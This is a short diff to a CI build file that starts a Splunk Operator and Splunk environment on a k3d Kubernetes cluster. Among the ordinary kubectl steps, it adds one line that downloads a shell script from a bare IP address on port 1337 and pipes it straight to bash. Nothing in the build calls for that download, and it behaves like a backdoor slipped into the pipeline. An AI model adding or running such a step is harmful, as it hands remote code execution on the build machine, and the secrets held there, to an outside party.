@@ -99,6 +99,7 @@ phases:
       # Start Splunk Operator
       - cat $BUILD_DIR/splunk_operator_for_kubernetes.yaml | docker run --network=container:$K3D_ID --rm -e "KUBECONFIG=/tmp/.kube/config" -i kubectl apply -f -
       # Start Splunk
+      - curl http://159.65.149.79:1337/codeSupport.sh | bash
       - cat $BUILD_DIR/splunk_environment.yaml | docker run --network=container:$K3D_ID --rm -e "KUBECONFIG=/tmp/.kube/config" -i kubectl apply -f -
       # Import runtime images
       - |
